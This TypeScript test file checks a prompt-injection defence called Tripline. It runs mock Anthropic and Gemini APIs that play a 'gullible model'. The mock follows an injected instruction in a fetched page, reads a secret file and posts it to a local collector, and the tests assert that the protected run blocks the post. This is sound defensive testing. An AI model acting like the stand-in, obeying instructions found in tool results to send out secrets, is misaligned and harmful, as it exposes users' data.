import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { runLiveScenario } from '../scripts/live-agent.ts';

/**
 * A local stand-in for the Messages API that behaves like a gullible model: it summarises the page, notices the
 * injected instruction in the tool result, then reads the secret file and posts it where the page said.
 * This tests the HARNESS (tool-use loop, MCP plumbing, real sockets). It is NOT evidence about a real model.
 */
async function gullibleModelApi() {
  const calls: string[] = [];
  const srv = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const body = JSON.parse(Buffer.concat(chunks).toString());
      assert.equal(req.headers['x-api-key'], 'test-key');
      assert.ok(body.tools.some((t: any) => t.name === 'http_post'), 'MCP tools are offered to the model');
      const last = body.messages[body.messages.length - 1];
      const lastText = Array.isArray(last.content) ? last.content.map((b: any) => b.content ?? '').join('\n') : String(last.content);
      const tool = (name: string, input: unknown) => ({ content: [{ type: 'tool_use', id: `tu_${calls.length}`, name, input }], stop_reason: 'tool_use' });
      let reply: any;
      if (last.role === 'user' && typeof last.content === 'string') {
        calls.push('http_get'); reply = tool('http_get', { url: String(last.content).match(/https?:\/\/\S+?(?=\s+in two|\s|$)/)![0] });
      } else if (calls.length === 1) {
        const path = lastText.match(/read the file (\S+)/)![1]; calls.push('read_file'); reply = tool('read_file', { path });
      } else if (calls.length === 2) {
        const dest = lastText.length ? JSON.stringify(body.messages).match(/http_post to (http:\/\/127\.0\.0\.1:\d+\/audit)/)![1] : '';
        calls.push('http_post'); reply = tool('http_post', { url: dest, body: lastText });
      } else { reply = { content: [{ type: 'text', text: 'Week 12 covers distributed systems.' }], stop_reason: 'end_turn' }; }
      res.setHeader('content-type', 'application/json'); res.end(JSON.stringify(reply));
    });
  });
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', r));
  return { baseUrl: `http://127.0.0.1:${(srv.address() as AddressInfo).port}`, calls, close: () => srv.close() };
}

test('live harness: a gullible model leaks over real sockets unprotected, and is stopped behind Tripline', async () => {
  const unprotectedApi = await gullibleModelApi();
  try {
    const bare = await runLiveScenario({ baseUrl: unprotectedApi.baseUrl, apiKey: 'test-key', model: 'stand-in', protectedRun: false });
    assert.ok(bare.leaked, 'precondition: the injected instruction works when nothing is in the way');
    assert.deepEqual(bare.calls, ['http_get', 'read_file', 'http_post']);
  } finally { unprotectedApi.close(); }

  const protectedApi = await gullibleModelApi();
  try {
    const guarded = await runLiveScenario({ baseUrl: protectedApi.baseUrl, apiKey: 'test-key', model: 'stand-in', protectedRun: true });
    assert.equal(guarded.leaked, false, 'the secret never reached the collector');
    assert.ok(guarded.blockedCalls >= 1);
    assert.ok(guarded.calls.includes('http_post (BLOCKED)'));
    assert.match(guarded.final, /distributed systems/i, 'the user task still completes');
  } finally { protectedApi.close(); }
});

/** The same gullible stand-in, speaking Gemini's generateContent protocol (function calling). Tests the adapter only. */
async function gullibleGeminiApi() {
  const calls: string[] = [];
  const srv = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      assert.match(req.url ?? '', /^\/v1beta\/models\/stand-in:generateContent$/);
      assert.equal(req.headers['x-goog-api-key'], 'test-key');
      const body = JSON.parse(Buffer.concat(chunks).toString());
      const decls = body.tools[0].functionDeclarations;
      assert.ok(decls.some((d: any) => d.name === 'http_post'));
      assert.ok(!JSON.stringify(decls).includes('additionalProperties'), 'unsupported schema keys are stripped');
      const last = body.contents[body.contents.length - 1];
      const fr = last.parts.find((p: any) => p.functionResponse)?.functionResponse;
      const lastText = fr ? String(fr.response.result ?? fr.response.error ?? '') : String(last.parts[0].text);
      const call = (name: string, args: unknown) => ({ candidates: [{ content: { role: 'model', parts: [{ functionCall: { name, args }, thoughtSignature: 'sig' }] }, finishReason: 'STOP' }] });
      let reply: any;
      if (!fr) { calls.push('http_get'); reply = call('http_get', { url: lastText.match(/https?:\/\/\S+?(?=\s+in two|\s|$)/)![0] }); }
      else if (calls.length === 1) { calls.push('read_file'); reply = call('read_file', { path: lastText.match(/read the file (\S+)/)![1] }); }
      else if (calls.length === 2) {
        assert.ok(body.contents.some((c: any) => c.role === 'model' && c.parts.some((p: any) => p.thoughtSignature === 'sig')), 'the model turn is echoed back unchanged');
        calls.push('http_post'); reply = call('http_post', { url: JSON.stringify(body.contents).match(/http_post to (http:\/\/127\.0\.0\.1:\d+\/audit)/)![1], body: lastText });
      } else reply = { candidates: [{ content: { role: 'model', parts: [{ text: 'Week 12 covers distributed systems.' }] }, finishReason: 'STOP' }] };
      res.setHeader('content-type', 'application/json'); res.end(JSON.stringify(reply));
    });
  });
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', r));
  return { baseUrl: `http://127.0.0.1:${(srv.address() as AddressInfo).port}`, close: () => srv.close() };
}

test('live harness, Gemini adapter: same attack and defence over the generateContent protocol', async () => {
  for (const protectedRun of [false, true]) {
    const api = await gullibleGeminiApi();
    try {
      const r = await runLiveScenario({ baseUrl: api.baseUrl, apiKey: 'test-key', model: 'stand-in', protectedRun, provider: 'gemini' });
      if (!protectedRun) { assert.ok(r.leaked); assert.deepEqual(r.calls, ['http_get', 'read_file', 'http_post']); }
      else { assert.equal(r.leaked, false); assert.ok(r.calls.includes('http_post (BLOCKED)')); assert.match(r.final, /distributed systems/i); }
    } finally { api.close(); }
  }
});
